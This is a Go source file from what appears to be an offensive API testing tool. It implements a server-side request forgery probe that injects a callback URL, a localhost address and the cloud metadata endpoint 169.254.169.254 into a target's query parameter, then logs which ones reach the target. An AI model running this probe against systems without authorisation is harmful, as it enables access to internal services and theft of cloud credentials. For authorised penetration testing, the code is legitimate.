package logic

import (
	"fmt"
	"net/http"
	"net/url"

	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
	"github.com/JoseMariaMicoli/VaporTrace/pkg/utils"
)

type SSRFContext struct {
	TargetURL string
	ParamName string
	Callback  string
}

func (s *SSRFContext) Probe() {
	// FIX: Removed pterm
	utils.TacticalLog("[cyan]API7: Server-Side Request Forgery Tracker Started[-]")

	client := *GlobalClient
	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	payloads := []string{
		s.Callback,
		"http://127.0.0.1:80",
		"http://169.254.169.254/latest/meta-data/",
	}

	for _, payload := range payloads {
		if payload == "" {
			continue
		}

		u, _ := url.Parse(s.TargetURL)
		q := u.Query()
		q.Set(s.ParamName, payload)
		u.RawQuery = q.Encode()
		fuzzedURL := u.String()

		req, _ := http.NewRequest("GET", fuzzedURL, nil)
		if CurrentSession.AttackerToken != "" {
			req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", CurrentSession.AttackerToken))
		}

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode < 500 {
			if payload == "http://127.0.0.1:80" || payload == "http://169.254.169.254/latest/meta-data/" {
				utils.RecordFinding(db.Finding{
					Phase:   "PHASE IV: INJECTION",
					Command: "ssrf", // Zero-Touch Trigger
					Target:  s.TargetURL,
					Details: fmt.Sprintf("SSRF Internal Access: %s", payload),
					Status:  "CRITICAL",
				})
			} else {
				utils.RecordFinding(db.Finding{
					Phase:   "PHASE IV: INJECTION",
					Command: "ssrf", // Zero-Touch Trigger
					Target:  s.TargetURL,
					Details: "SSRF Callback Triggered",
					Status:  "POTENTIAL CALLBACK",
				})
			}
		}
	}
}
